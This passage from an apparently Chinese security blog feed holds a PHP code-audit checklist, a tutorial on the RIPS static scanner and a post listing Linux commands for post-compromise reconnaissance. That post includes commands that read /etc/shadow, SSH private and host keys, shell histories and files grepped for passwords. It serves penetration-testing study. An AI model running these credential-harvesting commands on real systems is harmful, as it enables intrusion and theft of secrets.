title="二次注入"></a>二次注入</h4><p>攻击payload首先被Web服务器上的应用存储，随后又在关键操作中被使用，这就是二次注入。虽然我们在第一次注入的时候做了足够的过滤，但是第一次构造出可能在第二次调用时触发的payload引发注入，所以在重复利用输入的值的位置需要额外注意。</p><h4 id="文件名注入"><a href="#文件名注入" class="headerlink" title="文件名注入"></a>文件名注入</h4><p>php.ini中配置安全策略可以隔绝相当一部分的sql注入，比如magic_quote_gpc=on开启之后，能实现addslshes()和stripslashes()这两个函数的功能，但是这些功能不会过滤因为$_FILE，$_SERVER之类的值</p><p>有些cms会把文件名name的值保存在数据库里，但又没有对name进行过滤，可能会造成注入，所以在有对文件名处理的位置，除了考虑文件上传漏洞，也不要忘记分析一下产生sql注入的可能。</p><h2 id="0x03-xss"><a href="#0x03-xss" class="headerlink" title="0x03 xss"></a>0x03 xss</h2><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>反射型xss审计的时候基本的思路都一样，通过寻找可控没有过滤（或者可以绕过）的参数，通过echo等输出函数直接输出。寻找的一般思路就是寻找输出函数，再去根据函数寻找变量。一般的输出函数有这些：print , print_r , echo , printf , sprintf , die , var_dump ,var_export。</p><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型xss审计和反射型xss审计时候思路差不多，不过存储型xss会在数据库中转一下，注意审计sql语句update ,insert更新和插入。</p><h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>基于DOM的跨站脚本XSS：通过访问document.URL 或者document.location执行一些客户端逻辑的javascript代码。不依赖发送给服务器的数据。</p><p>审计DOM型XSS时，关注输入可以影响的document.URL等位置。</p><h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p>PHP的文件包含可以直接执行包含文件的代码，包含的文件格式是不受限制的，只要能正常执行即可。</p><p>文件包含分为本地包含和远程包含。</p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>服务器的php配置中选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，会产生远程文件包含的问题，所以面对这种问题，着重看是否打开了这两个配置选项。</p><p>如果非要用到远程文件，在include() ; include_once() ; require();require_once()等代码的位置，要将文件名限制为固定值，完全无法被用户控制。</p><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>本地文件包含要查看的代码段和远程文件包含一样，主要查看<br>include() ; include_once() ; require();require_once()这四个函数的位置，要着重查看参数是否外部可控，尽量使其固定。</p><p>如果必须要求可控的话，查看是否经历了白名单验证文件名，或者通过函数过滤了危险的字符如“../”。</p><h2 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h2><p>文件上传漏洞需要审计的部分是上传函数</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">move_uploaded_file()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在这个函数周围，要查看是否后端检查，检查的是后缀，文件头，还是content-type。如果检查的是文件头和content-type，即</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getimagesize</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">mime_content_type</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>等就会产生风险。<br>还要检查是黑名单过滤还是白名单过滤，如果是黑名单过滤，则要检查是否过滤全面了（大小写等）。</p><p>如果代码中没有将文件名整体重命名的函数，建议在这里加一个提升安全性。</p><p>除了代码中需要检查的部分，还要检查服务器的配置文件和php插件php-cgi等，以及服务器版本是否存在解析漏洞。</p><p>ps：文件上传这里，比起代码审计更好的方式是采取黑盒测试。</p><h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><p>php反序列化的审计，主要是查找 unserialize();函数的位置。</p><p>观察unserialize();函数的参数是否是用户可控的，如果可控就很容易被利用，再观察对传入参数的过滤函数检查情况。</p><h2 id="0x07-csrf"><a href="#0x07-csrf" class="headerlink" title="0x07 csrf"></a>0x07 csrf</h2><p>csrf跨站请求伪造漏洞审计时主要查看在登陆后提交的代码部分，有没有通过token和referer对用户身份的合法性进行验证。还有整体有没有设置跨域权限。</p><h2 id="0x08-ssrf"><a href="#0x08-ssrf" class="headerlink" title="0x08 ssrf"></a>0x08 ssrf</h2><p>对于ssrf服务端请求伪造的审计，主要去找curl命令等接收远程请求的位置有没有过滤返回信息，验证远程服务器对请求的响应，查看有没有禁用不需要的协议。</p><h2 id="0x09-代码、命令执行"><a href="#0x09-代码、命令执行" class="headerlink" title="0x09 代码、命令执行"></a>0x09 代码、命令执行</h2><p>首先来说一下命令执行，命令执行就是调用系统命令cmd或者应用指令bash，审计的时候去找会执行命令的函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>然后查看这些位置有没有严格的过滤规则。</p><p>代码执行漏洞会将可执行代码放在webservice中执行，审计代码执行漏洞时，可以去寻找php中将字符串转换成代码并执行的函数，主要去搜索</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">asset</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func_array</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">array_map</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>然后查看这些位置有没有严格的过滤规则。</p><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>上述这些漏洞的原理都基本写过一遍，大部分也做了复现，所以这里不再详细解释，只是整理一下审计过程中需要注意的位置，留作笔记。</p><p>顺便送上两张代码审计的思维导图</p><p>php代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png</a></p><p>python代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg</a></p><p>代码审计的溢出导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png</a></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计工具RIPS</title>
    <link href="/2018/05/11/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7RIPS/"/>
    <url>/2018/05/11/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7RIPS/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-代码审计工具RIPS"><a href="#0x00-代码审计工具RIPS" class="headerlink" title="0x00 代码审计工具RIPS"></a>0x00 代码审计工具RIPS</h2><p>在安全工作中，代码审计是很重要的一项技能。在面对大规模的代码时，<br>使用自动化工具辅助人工漏洞挖掘，可以显著提高审计工作的效率。学会利用自动化代码审计工具，是每一个代码审计人员必备的能力。</p><p>博主在代码审计过程中选择使用RIPS，它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞如XSS ，sql注入，敏感信息泄漏，文件包含等常见漏洞；也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。当然，最后去校验结果必须是我们自己去做的。</p><h2 id="0x01-安装与配置"><a href="#0x01-安装与配置" class="headerlink" title="0x01 安装与配置"></a>0x01 安装与配置</h2><p>rips官网：<a href="http://rips-scanner.sourceforge.net/">http://rips-scanner.sourceforge.net/</a><br>我们下载最新版本的rips之后，将压缩包解压后放在本地网站根目录下，通过浏览器（最好是firefox，因为rips宣称只支持firefox）访问即可使用。</p><h2 id="0x02-主界面介绍"><a href="#0x02-主界面介绍" class="headerlink" title="0x02 主界面介绍"></a>0x02 主界面介绍</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips01.png"></p><ul><li>subdirs：如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选。</li><li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li><li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li><li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li><li>/regex/：使用正则表达式过滤结果。</li><li>path/file： 要扫描的目录。</li><li>scan： 开始扫描。</li></ul><p>主界面就这些功能按键，我们接下来尝试一下。</p><h2 id="0x03-实践"><a href="#0x03-实践" class="headerlink" title="0x03 实践"></a>0x03 实践</h2><p>在路径处输入我搭建的各种渗透测试环境的网页根目录，然后点击scan，稍等一会就会出现全部结果，并以图表的方式弹出一个总结的结果页面。</p><p>我们可以发现，198个文件就报告了163个疑似漏洞的代码。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips02.png"></p><p>然后我们看这些报告</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips03.png"></p><p>点击每一个代码块左上角的书页小图标，就会展开这个代码的详情。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips04.png"></p><p>点击每一个代码块左上角的红色小图标，可以生成漏洞的利用代码。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips05.png"></p><p>将生成的php代码放在php文件里面传入参数就可以运行</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips06.png"></p><p>点击每一个代码块左上角的问号小图标，就会展开这个漏洞的详情、原理。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips07.png"></p><p>同样，问号中还有漏洞的解决方案和更安全的范例代码书写方法。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips08.png"></p><p>总是将期望的字符串嵌入到引号中，并在将其嵌入查询之前使用PHP构建函数将字符串转义。 </p><p>始终嵌入不带引号的预期整数，并在将数据嵌入查询之前将数据转换为整数。 </p><p>转义数据但嵌入不带引号并不安全。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>方便使用的工具十分重要，但同时工具也只是帮我们更快速的筛选一遍有可能出现问题的地方，然后我们需要做的就是自己去审计，将真正有隐患的地方寻找出来并提出解决方案。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透常用命令总结（linux）</title>
    <link href="/2018/05/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%EF%BC%88linux%EF%BC%89/"/>
    <url>/2018/05/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%EF%BC%88linux%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了windows系统在内网渗透和提权中的常用命令，这篇总结下linux在内网渗透中常用的命令。</p><h2 id="0x01-查看操作系统信息"><a href="#0x01-查看操作系统信息" class="headerlink" title="0x01 查看操作系统信息"></a>0x01 查看操作系统信息</h2><h4 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue<br>cat <span class="hljs-regexp">/etc/</span>*-release<br>cat <span class="hljs-regexp">/etc/</span>lsb-release      <span class="hljs-comment"># Debian </span><br>cat <span class="hljs-regexp">/etc/</span>redhat-release   <span class="hljs-comment"># Redhat</span><br></code></pre></td></tr></table></figure><h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tcl">cat /<span class="hljs-keyword">proc</span>/version<br>uname -a<br>uname -mrs<br>rpm -q<span class="hljs-title"> kernel</span><br><span class="hljs-title">dmesg</span> |<span class="hljs-title"> grep</span> Linux<br>ls /boot |<span class="hljs-title"> grep</span> vmlinuz-<br></code></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/<span class="hljs-keyword">profile</span><br><span class="hljs-keyword">cat</span> /etc/bashrc<br><span class="hljs-keyword">cat</span> ~/.bash_profile<br><span class="hljs-keyword">cat</span> ~/.bashrc<br><span class="hljs-keyword">cat</span> ~/.bash_logout<br>env<br><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure><h2 id="0x02-应用和服务"><a href="#0x02-应用和服务" class="headerlink" title="0x02 应用和服务"></a>0x02 应用和服务</h2><h4 id="正在运行的程序和权限"><a href="#正在运行的程序和权限" class="headerlink" title="正在运行的程序和权限"></a>正在运行的程序和权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span><br>top<br><span class="hljs-built_in">cat</span> /etc/services<br></code></pre></td></tr></table></figure><p>如果要查询root权限运行的进程，可以补充为</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> root<br><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> root<br></code></pre></td></tr></table></figure><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -alh <span class="hljs-regexp">/usr/</span>bin/<br>ls -alh <span class="hljs-regexp">/sbin/</span><br>dpkg -l<br>rpm -qa<br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives<br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/yum/</span><br></code></pre></td></tr></table></figure><h4 id="服务的配置文件"><a href="#服务的配置文件" class="headerlink" title="服务的配置文件"></a>服务的配置文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>syslog.conf<br>cat <span class="hljs-regexp">/etc/</span>chttp.conf<br>cat <span class="hljs-regexp">/etc/</span>lighttpd.conf<br>cat <span class="hljs-regexp">/etc/</span>cups/cupsd.conf<br>cat <span class="hljs-regexp">/etc/i</span>netd.conf<br>cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf<br>cat <span class="hljs-regexp">/etc/my</span>.conf<br>cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br>cat <span class="hljs-regexp">/opt/</span>lampp<span class="hljs-regexp">/etc/</span>httpd.conf<br>ls -aRl <span class="hljs-regexp">/etc/</span> | awk <span class="hljs-string">&#x27;$1 ~ /^.*r.*/&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | <span class="hljs-keyword">grep</span> cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>at.allow<br>cat <span class="hljs-regexp">/etc/</span>at.deny<br>cat <span class="hljs-regexp">/etc/</span>cron.allow<br>cat <span class="hljs-regexp">/etc/</span>cron.deny<br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <span class="hljs-regexp">/etc/</span>anacrontab<br>cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/root<br></code></pre></td></tr></table></figure><h4 id="存储的明文用户名，密码"><a href="#存储的明文用户名，密码" class="headerlink" title="存储的明文用户名，密码"></a>存储的明文用户名，密码</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">grep</span> -i user [filename]<br><span class="hljs-keyword">grep</span> -i pass [filename]<br><span class="hljs-keyword">grep</span> -C <span class="hljs-number">5</span> <span class="hljs-string">&quot;password&quot;</span> [filename]<br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-keyword">print</span><span class="hljs-number">0</span> | xargs -<span class="hljs-number">0</span> <span class="hljs-keyword">grep</span> -i -n <span class="hljs-string">&quot;var $password&quot;</span>   <span class="hljs-comment"># Joomla</span><br></code></pre></td></tr></table></figure><h2 id="0x03-网络相关"><a href="#0x03-网络相关" class="headerlink" title="0x03 网络相关"></a>0x03 网络相关</h2><h4 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ifconfig -a<br>cat <span class="hljs-regexp">/etc/</span>network/interfaces<br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network<br></code></pre></td></tr></table></figure><h4 id="网络配置-DNS-DHCP-网关"><a href="#网络配置-DNS-DHCP-网关" class="headerlink" title="网络配置,DNS,DHCP,网关"></a>网络配置,DNS,DHCP,网关</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>resolv.conf<br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network<br>cat <span class="hljs-regexp">/etc/</span>networks<br>iptables -L<br>hostname<br>dnsdomainname<br></code></pre></td></tr></table></figure><h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lsof</span> -i<br><span class="hljs-attribute">lsof</span> -i :<span class="hljs-number">80</span><br><span class="hljs-attribute">grep</span> <span class="hljs-number">80</span> /etc/services<br><span class="hljs-attribute">netstat</span> -antup<br><span class="hljs-attribute">netstat</span> -antpx<br><span class="hljs-attribute">netstat</span> -tulpn<br><span class="hljs-attribute">chkconfig</span> --list<br><span class="hljs-attribute">chkconfig</span> --list | grep <span class="hljs-number">3</span>:<span class="hljs-literal">on</span><br><span class="hljs-attribute">last</span><br><span class="hljs-attribute">w</span><br></code></pre></td></tr></table></figure><h4 id="路由缓存"><a href="#路由缓存" class="headerlink" title="路由缓存"></a>路由缓存</h4><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">arp -e<br><span class="hljs-keyword">route</span><br><span class="hljs-keyword">route</span> -nee<br></code></pre></td></tr></table></figure><h2 id="0x04-用户相关"><a href="#0x04-用户相关" class="headerlink" title="0x04 用户相关"></a>0x04 用户相关</h2><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">id<br>who<br>w<br>last<br>cat <span class="hljs-regexp">/etc/</span>passwd<br>cat <span class="hljs-regexp">/etc/g</span>roup<br>cat <span class="hljs-regexp">/etc/</span>shadow<br>ls -alh <span class="hljs-regexp">/var/m</span>ail/<br>grep -v -E <span class="hljs-string">&quot;^#&quot;</span> <span class="hljs-regexp">/etc/</span>passwd | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>   <span class="hljs-comment"># 列出超级用户</span><br>awk -F: <span class="hljs-string">&#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd   <span class="hljs-comment">#列出超级用户</span><br>cat <span class="hljs-regexp">/etc/</span>sudoers<br>sudo -l<br></code></pre></td></tr></table></figure><h4 id="列主目录"><a href="#列主目录" class="headerlink" title="列主目录"></a>列主目录</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -ahlR <span class="hljs-regexp">/root/</span><br>ls -ahlR <span class="hljs-regexp">/home/</span><br></code></pre></td></tr></table></figure><h4 id="其他用户的操作记录"><a href="#其他用户的操作记录" class="headerlink" title="其他用户的操作记录"></a>其他用户的操作记录</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cat ~<span class="hljs-string">/.bash_history</span><br>cat ~<span class="hljs-string">/.nano_history</span><br>cat ~<span class="hljs-string">/.atftp_history</span><br>cat ~<span class="hljs-string">/.mysql_history</span><br>cat ~<span class="hljs-string">/.php_history</span><br></code></pre></td></tr></table></figure><h4 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat ~<span class="hljs-regexp">/.ssh/</span>authorized_keys<br>cat ~<span class="hljs-regexp">/.ssh/i</span>dentity.pub<br>cat ~<span class="hljs-regexp">/.ssh/i</span>dentity<br>cat ~<span class="hljs-regexp">/.ssh/i</span>d_rsa.pub<br>cat ~<span class="hljs-regexp">/.ssh/i</span>d_rsa<br>cat ~<span class="hljs-regexp">/.ssh/i</span>d_dsa.pub<br>cat ~<span class="hljs-regexp">/.ssh/i</span>d_dsa<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_config<br>cat <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_dsa_key.pub<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_dsa_key<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_rsa_key.pub<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_rsa_key<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_key.pub<br>cat <span class="hljs-regexp">/etc/</span>ssh/ssh_host_key<br></code></pre></td></tr></table></figure><h2 id="0x05-文件系统相关"><a href="#0x05-文件系统相关" class="headerlink" title="0x05 文件系统相关"></a>0x05 文件系统相关</h2><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -alh <span class="hljs-regexp">/var/</span>log<br>ls -alh <span class="hljs-regexp">/var/m</span>ail<br>ls -alh <span class="hljs-regexp">/var/</span>spool<br>ls -alh <span class="hljs-regexp">/var/</span>spool/lpd<br>ls -alh <span class="hljs-regexp">/var/</span>lib/pgsql<br>ls -alh <span class="hljs-regexp">/var/</span>lib/mysql<br>cat <span 